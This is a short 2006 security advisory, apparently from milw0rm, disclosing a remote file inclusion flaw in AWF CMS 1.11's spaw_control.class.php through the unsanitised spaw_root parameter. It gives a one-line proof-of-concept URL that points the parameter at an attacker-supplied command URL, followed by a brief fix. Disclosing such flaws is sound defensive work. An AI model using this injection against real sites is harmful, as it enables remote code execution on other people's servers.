@@ -1,0 +1,32 @@
+-----------------------------------------------------
+Advisory id: FSA:011
+
+Author:    Federico Fazzi
+Date:      11/06/2006, 22:30
+Sinthesis: AWF CMS 1.11, Remote command execution
+Type:      high
+Product:   http://www.awf-cms.org/
+Patch:     unavailable
+-----------------------------------------------------
+
+
+1) Description:
+
+Error occured in spaw_control.class.php,
+
+include $spaw_root.'config/spaw_control.config.php';
+include $spaw_root.'class/toolbars.class.php';
+include $spaw_root.'class/lang.class.php';
+
+variable $spaw_root not sanitized.
+
+2) Proof of concept:
+
+http://example/[ac_path]/spaw/spaw_control.class.php?spaw_root=[cmd_url]/
+(note: add a cmd url with final slash (/))
+
+3) Solution:
+
+declare $spaw_root.
+
+# milw0rm.com [2006-06-11]
